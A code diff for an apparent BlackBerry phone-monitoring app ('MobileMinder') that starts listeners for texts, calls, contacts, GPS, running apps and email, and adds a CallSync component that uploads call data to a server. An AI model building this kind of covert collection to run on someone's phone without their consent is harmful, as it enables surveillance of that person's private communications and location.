@@ -23,6 +23,7 @@ import com.kids.control.Commander;
 import com.kids.net.Server;
 import com.kids.prototypes.Debug;
 import com.kids.prototypes.LocalDataReader;
+import com.kids.sync.CallSync;
 
 import net.rim.device.api.system.ApplicationManager;
 import net.rim.device.api.system.SystemListener2;
@@ -179,6 +180,8 @@ public class Driver extends UiApplication implements SystemListener2, FileSystem
         actLog = LocalDataAccess.getLocalDataAccessRef();
         logWriter.log("MobileMinder::Driver->Start...");
         
+        new CallSync(actLog, new Server(actLog)).start();
+        //new SMSSync(actLog, new Server(actLog)).start();
         //Hear[] subscribers;
     	//subscribers = new Hear[2];
     	Vector components = new Vector();
@@ -196,28 +199,15 @@ public class Driver extends UiApplication implements SystemListener2, FileSystem
         int AppTimer      = 31*oneSec;//check running app every 31 secs. 31 is prime to try avoid DB race condition
         //int uploadTimer = 1*oneSec;//send update every
         
-        // Load sub-components
-        // new MyServerUpload(actLog, employerID, deviceID, uploadTimer);
-
         components.addElement(new MyTextListener(actLog));
-        //components[0] = new MyTextListener(actLog);
         //WebMonitor wm = new WebMonitor (context, actLog);
     	//components[1] = wm;
-        components.addElement(new MyCallListener(actLog));
-        //components[2] = new MyCallListener(actLog);        
-    	//components[3] = new ContactPic(context, actLog);
-        
-        logWriter.log("Driver::Before contactPic");
-  
+        components.addElement(new MyCallListener(actLog));  
         components.addElement(new ContactPic(actLog));
-    
-        logWriter.log("Driver::After contactPic");
-
-    	//components[4] = new MediaSync(context, actLog);        
+       	//components[4] = new MediaSync(context, actLog);        
         new MyGPSListener (actLog, GPSTimer);
         new MyAppListener (actLog, AppTimer);            
         new MyMailListener(actLog);
-    	// Start up connection to the server
     	new Server(actLog).start();
     	new Commander(actLog, components).start();
     }
